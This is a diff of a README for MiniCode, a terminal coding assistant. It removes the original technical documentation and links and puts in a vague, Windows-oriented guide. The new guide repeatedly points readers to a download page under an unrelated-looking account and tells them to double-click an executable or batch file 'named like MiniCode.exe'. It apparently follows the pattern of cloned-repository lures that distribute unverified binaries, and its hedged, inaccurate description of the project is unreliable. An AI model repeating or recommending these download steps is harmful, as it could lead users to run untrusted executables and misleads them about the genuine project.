@@ -1,551 +1,174 @@
-# MiniCode
+# 🧠 MiniCode - Learn Coding with a Clean Terminal
 
-<p align="center">
-  <img src="./docs/logo.svg" alt="MiniCode Logo" width="180" />
-</p>
+[![Download MiniCode](https://img.shields.io/badge/Download%20MiniCode-5A5A5A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dowered-depressor172/MiniCode)
 
-<h2 align="center">MiniCode</h2>
+## 🚀 What MiniCode Does
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Editor-Minicode-D97757?style=for-the-badge" alt="Editor: Minicode" />
-  <img src="https://img.shields.io/badge/%23minicode-Project-B85C3F?style=for-the-badge" alt="#minicode" />
-  <img src="https://img.shields.io/badge/%23lightweight-Focus-F0EBE1?style=for-the-badge&labelColor=8B8B8B" alt="#lightweight" />
-</p>
+MiniCode is a light terminal app that helps you work with code from a simple text screen. It is built for learning, testing ideas, and seeing how an AI coding flow works.
 
----
+It gives you a clean setup for:
+- asking for code help
+- running tool-based steps
+- moving through tasks in a loop
+- trying the app in a terminal view
 
-<p align="center">
-  A lightweight, highly efficient coding tool. Designed for speed, built for simplicity.
-</p>
+MiniCode has versions in:
+- TypeScript
+- Python
+- Rust
 
-[简体中文](./README.zh-CN.md) | [DeepWiki](https://deepwiki.com/LiuMengxuan04/MiniCode) | [Architecture](./ARCHITECTURE.md) | [Contributing](./CONTRIBUTING.md) | [Roadmap](./ROADMAP.md) | [Learn Claude Code Design Through MiniCode](./CLAUDE_CODE_PATTERNS.md) | [License](./LICENSE)
+This makes it useful for people who want to compare how the same idea works in different languages.
 
-A lightweight terminal coding assistant for local development workflows.
+## 💻 What You Need
 
-MiniCode provides Claude Code-like workflow and architectural ideas in a much smaller implementation, making it especially useful for learning, experimentation, and custom tooling.
-
-You can also explore this project through [DeepWiki](https://deepwiki.com/LiuMengxuan04/MiniCode).
+MiniCode runs on Windows and works best on a recent version of Windows 10 or Windows 11.
 
-## Overview
+You will need:
+- a Windows PC
+- internet access
+- a terminal or command prompt
+- enough free space for the app and files it may create
 
-MiniCode is built around a practical terminal-first agent loop:
+If you plan to use the TypeScript version, you may also need Node.js. The Python version may need Python. The Rust version may need Rust tools. For most users, the easiest path is to start with the Windows setup from the main project page.
 
-- accept a user request
-- inspect the workspace
-- call tools when needed
-- review file changes before writing
-- return a final response in the same terminal session
-
-The project is intentionally compact, so the control flow, tool model, and TUI behavior remain easy to understand and extend.
-
-## Multi-language Versions
-
-- TypeScript (this repo): [MiniCode](https://github.com/LiuMengxuan04/MiniCode)
-- Rust version: [MiniCode-rs (latest)](https://github.com/harkerhand/MiniCode-rs/tree/master)
-- Python version: [MiniCode-Python](https://github.com/QUSETIONS/MiniCode-Python)
-
-## Branch Highlights
-
-- TypeScript version: the reference implementation for MiniCode's core workflow, documentation, and product showcase, now including per-project sessions, provider-usage context accounting, auto-compact, and large tool-result storage.
-- Rust version: keeps conversation history inside the working directory, making it easier to move or migrate a project without losing its local MiniCode context.
-- Python version: a Python-native implementation branch. More branch-specific features are still being shaped.
-
-## Table of Contents
-
-- [Product Showcase Page](#product-showcase-page)
-- [Why MiniCode](#why-minicode)
-- [Features](#features)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Commands](#commands)
-- [Long Sessions and Context Management](#long-sessions-and-context-management)
-- [Configuration](#configuration)
-- [Skills and MCP Usage](#skills-and-mcp-usage)
-- [Star History](#star-history)
-- [Project Structure](#project-structure)
-- [Code Size](#code-size)
-- [Architecture Docs](#architecture-docs)
-- [Contributing](#contributing)
-- [Roadmap](#roadmap)
-- [Learn Claude Code Design Through MiniCode](#learn-claude-code-design-through-minicode)
-- [Development](#development)
-
-## Product Showcase Page
-
-- Open [docs/index.html](./docs/index.html) in a browser for a visual product overview.
-- GitHub Pages (recommended): `https://liumengxuan04.github.io/MiniCode/`
-
-## Why MiniCode
-
-MiniCode is a good fit if you want:
+## 📥 Download MiniCode
 
-- a lightweight coding assistant instead of a large platform
-- a terminal UI with tool calling, transcript, and command workflow
-- a small codebase that is suitable for study and modification
-- a reference implementation for Claude Code-like agent architecture
-
-## Features
+Visit this page to download or get the latest project files:
 
-### Core workflow
-
-- multi-step tool execution in a single turn
-- model -> tool -> model loop
-- full-screen terminal interface
-- input history, transcript scrolling, and slash command menu
-- per-project session persistence with resume, rename, fork, and compact commands
-- model-aware context stats with provider usage, estimated tail tokens, and auto-compact
-- discoverable local skills via `SKILL.md`
-- dynamic MCP tool loading over stdio
-- MCP resources and prompts via generic MCP helper tools
+[Open the MiniCode download page](https://github.com/dowered-depressor172/MiniCode)
 
-### Built-in tools
-
-- `list_files`
-- `grep_files`
-- `read_file`
-- `write_file`
-- `edit_file`
-- `patch_file`
-- `modify_file`
-- `run_command`
-- `web_fetch`
-- `web_search`
-- `ask_user`
-- `load_skill`
-- `list_mcp_resources`
-- `read_mcp_resource`
-- `list_mcp_prompts`
-- `get_mcp_prompt`
-
-### Safety and usability
-
-- review-before-write flow for file modifications
-- path and command permission checks
-- local installer with independent config storage
-- support for Anthropic-style API endpoints
-- oversized tool results are stored on disk with a short in-context preview, keeping long command output from crowding out useful conversation context
-
-### Recent interaction upgrades
-
-- approval prompts now use Up/Down selection with Enter confirm
-- approval prompts also support direct letter/number shortcuts shown in each option
-- supports "reject with guidance" to send corrective instructions back to the model
-- edit approvals support "allow this file for this turn" and "allow all edits for this turn"
-- file review now uses standard unified diff output (closer to `git diff`)
-- approval view supports `Ctrl+O` expand/collapse plus wheel/page scrolling
-- `Ctrl+C` now exits cleanly even when an approval prompt is open
-- finished tool calls auto-collapse into concise summaries to reduce transcript noise
-- explicit background shell commands launched through `run_command` are now surfaced as lightweight shell tasks instead of remaining stuck as a forever-running tool call
-- TTY input handling is serialized, and CRLF Enter sequences are normalized so approval confirms do not accidentally fire twice
-- fixed an input-event deadlock where approval prompts could stop accepting Up/Down/Enter
-- escape-sequence parsing is hardened so malformed terminal input does not stall key handling
-- `run_command` now accepts single-string invocations like `"git status"` and auto-splits args
-- clarifying questions are now structured via `ask_user`, and the turn pauses until the user replies
-- context accounting is now provider-usage-driven: provider-reported usage anchors the context stats, auto-compact trigger, blocking/warning levels, and TUI context badge; the local estimator is used only when provider usage is unavailable or for messages added after the latest usage boundary
-- the TUI context badge distinguishes exact provider usage from estimated tail text, for example `ctx 82% ... usage+est`; compacted conversations mark retained pre-compact usage stale so it is not reused as current context truth
-- large tool results are persisted under MiniCode's local data directory and replaced in the model context by a preview plus file path; repeated passes reuse the same replacement so accounting stays stable
-
-## Installation
-
-```bash
-cd mini-code
-npm install
-npm run install-local
-```
-
-The installer will ask for:
-
-- model name
-- `ANTHROPIC_BASE_URL`
-- `ANTHROPIC_AUTH_TOKEN`
-
-Configuration is stored in:
-
-- `~/.mini-code/settings.json`
-- `~/.mini-code/mcp.json`
+## 🪟 Install on Windows
 
-You can override the config directory with `MINI_CODE_HOME`:
+Follow these steps on your Windows PC:
 
-```bash
-export MINI_CODE_HOME=/path/to/custom/dir
-npm run install-local
-```
-
-The launcher is installed to:
-
-- `~/.local/bin/minicode`
+1. Open the download page in your browser.
+2. Look for the latest release files or project files.
+3. Download the Windows-ready file or source package.
+4. If you get a compressed file, right-click it and choose Extract All.
+5. Open the folder you extracted.
+6. Look for a file named like `MiniCode.exe`, `run.bat`, or a similar start file.
+7. Double-click the file to start the app.
 
-You can override the launcher directory with `MINI_CODE_BIN_DIR`:
+If the project uses a terminal command instead of a direct app file:
+1. Open Command Prompt or PowerShell.
+2. Move into the MiniCode folder.
+3. Run the start command shown in the project files.
+4. Keep the terminal open while the app runs.
 
-```bash
-export MINI_CODE_BIN_DIR=/path/to/custom/bin
-npm run install-local
-```
+## 🛠️ First Run
 
-If `~/.local/bin` is not already on your `PATH`, add:
-
-```bash
-export PATH="$HOME/.local/bin:$PATH"
-```
-
-## Quick Start
-
-Run the installed launcher:
-
-```bash
-minicode
-```
-
-Run in development mode:
-
-```bash
-npm run dev
-```
-
-Run in offline demo mode:
-
-```bash
-MINI_CODE_MODEL_MODE=mock npm run dev
-```
-
-## Commands
-
-### Management commands
-
-- `minicode mcp list`
-- `minicode mcp add <name> [--project] [--protocol <mode>] [--url <endpoint>] [--header KEY=VALUE ...] [--env KEY=VALUE ...] [-- <command> [args...]]`
-- `minicode mcp login <name> --token <bearer-token>`
-- `minicode mcp logout <name>`
-- `minicode mcp remove <name> [--project]`
-- `minicode skills list`
-- `minicode skills add <path> [--name <name>] [--project]`
-- `minicode skills remove <name> [--project]`
-
-### Local slash commands
-
-- `/help`
-- `/tools`
-- `/skills`
-- `/mcp`
-- `/status`
-- `/model`
-- `/model <name>`
-- `/config-paths`
-
-### Terminal interaction
-
-- command suggestions and slash menu
-- transcript scrolling
-- prompt editing
-- input history navigation
-- approval selection and feedback input flow (Up/Down + Enter, or key shortcuts)
-
-### Session management
-
-MiniCode automatically saves your conversation after each turn. Each launch creates a new session with a unique ID.
-
-- `/resume` — open interactive session picker
-- `/resume <id>` — resume a specific session by ID
-- `/rename <name>` — rename the current session
-- `/new` — start a fresh session (previous session is preserved)
-- `/fork` — fork the current session into a new independent copy
-- `/compact` — compress context to free up context window space
-
-CLI flags:
-
-- `minicode --resume` — launch with session picker
-- `minicode --resume <id>` — resume a specific session
-- `minicode --fork <id>` — fork a session and resume the fork
-
-Sessions are scoped per working directory and stored in `~/.mini-code/projects/` using append-only JSONL. On exit, MiniCode prints the session ID so you can resume later. Sessions older than 30 days are automatically cleaned up.
-
-## Long Sessions and Context Management
-
-MiniCode now treats long-running conversations as a first-class workflow:
-
-- Provider usage, when returned by the model endpoint, is recorded on assistant response boundaries and used as the primary token source.
-- If messages are added after the latest provider usage boundary, MiniCode adds a local tail estimate and labels the badge accordingly, for example `usage+est`.
-- If no provider usage is available, MiniCode falls back to local estimation so offline mode and compatible gateways still work.
-- Context stats feed the TUI badge, warning/blocking levels, and auto-compact trigger.
-- `/compact` performs manual context compression and records a compact boundary in the session log.
-- Automatic compaction can summarize older turns once utilization gets high.
-- After compaction, retained pre-compact usage is marked stale so an old provider total is not mistaken for the current context size.
-- Oversized tool results are written to `~/.mini-code/tool-results/` and replaced in the visible context with a preview and the full-output path. A single result over `50_000` characters is persisted, and batches are reduced toward a `200_000` character visible budget.
-
-Session storage and context compression work together: `loadSession` resumes from the latest compact boundary, while `loadTranscript` can still rebuild the visible transcript from the JSONL event log.
-
-## Configuration
-
-Example configuration:
-
-```json
-{
-  "model": "your-model-name",
-  "mcpServers": {
-    "filesystem": {
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]
-    },
-    "remote-example": {
-      "protocol": "streamable-http",
-      "url": "https://example.com/mcp",
-      "headers": {
-        "Authorization": "Bearer your-token"
-      }
-    }
-  },
-  "env": {
-    "ANTHROPIC_BASE_URL": "https://api.anthropic.com",
-    "ANTHROPIC_AUTH_TOKEN": "your-token",
-    "ANTHROPIC_MODEL": "your-model-name"
-  }
-}
-```
+When you start MiniCode for the first time, it may ask you to set up a few things:
+- API details
+- a working folder
+- terminal access
+- a language choice
 
-Project-scoped MCP config is also supported through Claude Code compatible `.mcp.json`:
+Use the on-screen prompts to move through setup.
 
-```json
-{
-  "mcpServers": {
-    "filesystem": {
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]
-    }
-  }
-}
-```
+If the app asks for a Claude-style key or similar service key, enter the value you use for your AI provider. Keep it private and do not share it.
 
-For vendor compatibility, MiniCode now auto-negotiates stdio framing:
+If you are not sure what to enter, use the default choices shown on screen.
 
-- standard MCP `Content-Length` framing is tried first
-- if that fails, MiniCode falls back to newline-delimited JSON
-- you can force a mode per server with `"protocol": "content-length"` or `"protocol": "newline-json"`
-- for remote MCP over HTTP, use `"protocol": "streamable-http"` with `"url"` (and optional `"headers"`)
-- header values support environment interpolation, e.g. `"Authorization": "Bearer $MCP_TOKEN"`
+## 🧭 How to Use MiniCode
 
-Remote MCP authentication strategy (lightweight by design):
+MiniCode works in a terminal, so it uses text instead of buttons.
 
-- use `minicode mcp login <name> --token <bearer-token>` to store a bearer token locally
-- use `minicode mcp logout <name>` to clear a stored token
-- for now, MiniCode intentionally uses this token-based path instead of a full built-in OAuth callback + refresh state machine
-- this keeps the implementation small and aligned with MiniCode's lightweight architecture goals; full OAuth automation may be added later when needed
+Common actions may include:
+- typing a task
+- asking for code help
+- reviewing a plan
+- approving a step
+- watching the tool loop run
 
-Skills are discovered from:
+A simple flow may look like this:
+1. Start MiniCode.
+2. Type what you want help with.
+3. Read the plan or output.
+4. Confirm the next step if asked.
+5. Keep going until the task is done.
 
-- `./.mini-code/skills/<skill-name>/SKILL.md`
-- `~/.mini-code/skills/<skill-name>/SKILL.md`
-- `./.claude/skills/<skill-name>/SKILL.md`
-- `~/.claude/skills/<skill-name>/SKILL.md`
+Try short requests first, such as:
+- explain this file
+- create a small script
+- fix this error message
+- show me how this command works
 
-Configuration priority:
+## ⚙️ Main Features
 
-1. `~/.mini-code/settings.json`
-2. `~/.mini-code/mcp.json`
-3. project `.mcp.json`
-4. compatible existing local settings
-5. process environment variables
+### 🧩 Tool Loop Workflow
+MiniCode can follow a loop where it plans, acts, checks, and moves on. This helps you see how coding assistants break work into steps.
 
-## Skills and MCP Usage
+### 🖥️ Terminal User Interface
+The app uses a TUI, which means it works inside a terminal window. This keeps the screen simple and focused.
 
-MiniCode supports two extension layers:
+### 🌐 Multi-Language Versions
+You can look at the same project in TypeScript, Python, and Rust. This is useful if you want to compare styles or learn how each language handles the same job.
 
-- `skills`: local workflow instructions, usually described by a `SKILL.md`
-- `MCP`: external tool providers that expose tools, resources, and prompts into MiniCode
+### 🤖 Coding Assistant Flow
+MiniCode is built around an assistant workflow. It can help with code tasks, file work, and step-by-step actions.
 
-### Skills: install, inspect, trigger
+### 🔍 Learning-Friendly Design
+The project is made for study and testing. It is a good fit if you want to see how a coding agent works without a full desktop app.
 
-Install a local skill:
+## 🧪 Example Uses
 
-```bash
-minicode skills add ~/minimax-skills/skills/frontend-dev --name frontend-dev
-```
+You can use MiniCode to:
+- explore how coding assistants work
+- test a terminal-based workflow
+- compare TypeScript, Python, and Rust code
+- ask for help with small scripts
+- study how tool calls fit into a task loop
 
-List installed or discovered skills:
+It is a strong fit for users who want a simple way to try AI coding tools in a terminal.
 
-```bash
-minicode skills list
-```
+## 📁 Project Layout
 
-Inside the interactive UI, you can also run:
+The repository may include folders for each language version, such as:
+- `typescript`
+- `python`
+- `rust`
 
-```text
-/skills
-```
+You may also see files for:
+- startup steps
+- config settings
+- package lists
+- notes for running the app
 
-to inspect which skills are available in the current session.
+If you are not sure where to begin, open the main folder and look for the file that matches your language choice or your start method.
 
-If you explicitly mention a skill name, MiniCode will prefer loading it. For example:
+## 🔐 Safety and Privacy
 
-```text
-Use the frontend-dev skill and directly rebuild the current landing page instead of stopping at a plan.
-```
+When using any coding assistant:
+- check every command before you run it
+- review files before saving changes
+- keep secret keys private
+- use a test folder if you want to try something new
 
-If you want to be even more explicit:
+If MiniCode asks for access to files or tools, allow only what you need for your task.
 
-```text
-Load the fullstack-dev skill first, then follow its workflow to implement this task.
-```
+## ❓ Common Questions
 
-A common pattern is to clone an official or Claude Code-compatible skills repo locally and install from there:
+### Why use MiniCode instead of a normal editor?
+MiniCode is built around a task flow. It helps you watch the steps of the assistant, not just the end result.
 
-```bash
-git clone https://github.com/MiniMax-AI/skills.git ~/minimax-skills
-minicode skills add ~/minimax-skills/skills/frontend-dev --name frontend-dev
-```
+### Does it work without coding knowledge?
+Yes. You can start with simple requests and follow the prompts on screen.
 
-### MCP: install, inspect, trigger
+### Can I use it for learning?
+Yes. The project is made for learning and experimentation.
 
-Install a user-scoped MCP server:
+### Why are there multiple languages?
+The same idea is shown in more than one language so you can compare how each version works.
 
-```bash
-minicode mcp add MiniMax --env MINIMAX_API_KEY=your-key --env MINIMAX_API_HOST=https://api.minimaxi.com -- uvx minimax-coding-plan-mcp -y
-```
+### What if the window closes?
+Open MiniCode again from the same file or terminal command. If the app was waiting for input, it may have finished or hit an error.
 
-List configured MCP servers:
+## 📌 Quick Start Checklist
 
-```bash
-minicode mcp list
-```
-
-To configure an MCP server only for the current project, add `--project`:
-
-```bash
-minicode mcp add filesystem --project -- npx -y @modelcontextprotocol/server-filesystem .
-minicode mcp list --project
-```
-
-Inside the interactive UI, run:
-
-```text
-/mcp
-```
-
-to see which servers are connected, which protocol they negotiated, and how many tools / resources / prompts they expose.
-
-MCP tools are automatically registered as:
-
-```text
-mcp__<server_name>__<tool_name>
-```
-
-For example, after connecting the MiniMax MCP server you may see:
-
-- `mcp__minimax__web_search`
-- `mcp__minimax__understand_image`
-
-These tool names are not hand-written in MiniCode. They appear automatically after a successful MCP connection.
-
-### How to use them in chat
-
-The simplest approach is to just describe the task naturally and let the model decide when to use a skill or MCP tool:
-
-```text
-Search for recent Chinese-language resources about MCP and give me 5 representative links.
-```
-
-If MiniMax MCP is connected, the model will typically choose `mcp__minimax__web_search`.
-
-If you want a more controlled workflow, name the skill or target capability explicitly:
-
-```text
-Use the frontend-dev skill and directly modify the current project files to turn this page into a more complete product landing page.
-```
-
-Or:
-
-```text
-Use the connected MCP tools to search for the MiniMax MCP guide and summarize what capabilities it provides.
-```
-
-### When to use skills vs MCP
-
-- `skills` are better for workflow, conventions, domain-specific instructions, and reusable execution patterns
-- `MCP` is better for search, image understanding, browsers, filesystems, databases, and other remote capabilities
-
-A common combination is:
-
-- use a skill such as `frontend-dev` to shape how the work should be done
-- use MCP to provide external search, image understanding, or system integrations
-
-### Compatibility notes
-
-MiniCode currently focuses on:
-
-- local `SKILL.md` discovery with `load_skill`
-- stdio MCP servers
-- MCP tools
-- generic helper tools for MCP resources and prompts
-
-For vendor compatibility, MiniCode automatically tries:
-
-- standard `Content-Length` framing
-- then falls back to `newline-json` if needed
-
-That means servers such as MiniMax MCP, which use newline-delimited JSON over stdio, can still be connected directly.
-
-## Star History
-
-<a href="https://www.star-history.com/?repos=LiuMengxuan04%2FMiniCode&type=date&legend=top-left">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/image?repos=LiuMengxuan04/MiniCode&type=date&theme=dark&legend=bottom-right" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/image?repos=LiuMengxuan04/MiniCode&type=date&legend=bottom-right" />
-   <img alt="Star History Chart" src="https://api.star-history.com/image?repos=LiuMengxuan04/MiniCode&type=date&legend=bottom-right" />
- </picture>
-</a>
-
-## Learn Claude Code Design Through MiniCode
-
-If you want to study the project as a learning resource, continue with:
-
-- [What Claude Code Design Ideas You Can Learn Through MiniCode](./CLAUDE_CODE_PATTERNS.md)
-
-## Project Structure
-
-- `src/index.ts`: CLI entry
-- `src/agent-loop.ts`: multi-step model/tool loop
-- `src/tool.ts`: tool registry and execution
-- `src/skills.ts`: local skill discovery and loading
-- `src/mcp.ts`: stdio MCP client and dynamic tool wrapping
-- `src/manage-cli.ts`: top-level `minicode mcp` / `minicode skills` management commands
-- `src/session.ts`: append-only session JSONL, resume/fork/rename, compact boundaries, and expiry cleanup
-- `src/compact/*`: manual compact, auto-compact, and conversation summarization helpers
-- `src/utils/token-estimator.ts`: provider-usage-first context accounting with estimate fallback
-- `src/utils/tool-result-storage.ts`: large tool-output persistence and preview replacement
-- `src/tools/*`: built-in tools
-- `src/tui/*`: terminal UI modules
-- `src/config.ts`: runtime configuration loading
-- `src/install.ts`: interactive installer
-
-## Code Size
-
-Current core implementation size is about **7,874 lines**.
-
-Counting scope:
-
-- included: core TypeScript source, built-in tools, config, MCP, sessions, compaction, adapters, permissions, and `bin/minicode`
-- excluded: docs, tests, `external/`, `node_modules/`, and TUI files (`src/tui/`, `src/tty-app.ts`, `src/ui.ts`)
-
-If `src/tty-app.ts` and `src/ui.ts` are included while still excluding `src/tui/`, the total is about **9,767 lines**.
-
-## Architecture Docs
-
-- [Architecture Overview](./ARCHITECTURE.md)
-- [中文架构说明](./ARCHITECTURE_ZH.md)
-
-## Contributing
-
-- [Contribution Guidelines](./CONTRIBUTING.md)
-- [中文贡献规范](./CONTRIBUTING_ZH.md)
-
-## Roadmap
-
-- [Roadmap](./ROADMAP.md)
-- [路线图（中文）](./ROADMAP_ZH.md)
-
-## Development
-
-```bash
-npm run check
-```
-
-MiniCode is intentionally small and pragmatic. The goal is to keep the architecture understandable, hackable, and easy to extend.
+- open the project page
+- download the files
+- extract them if needed
+- start the Windows file or terminal command
+- follow the setup prompts
+- try a short task first
+- keep the terminal open while it runs
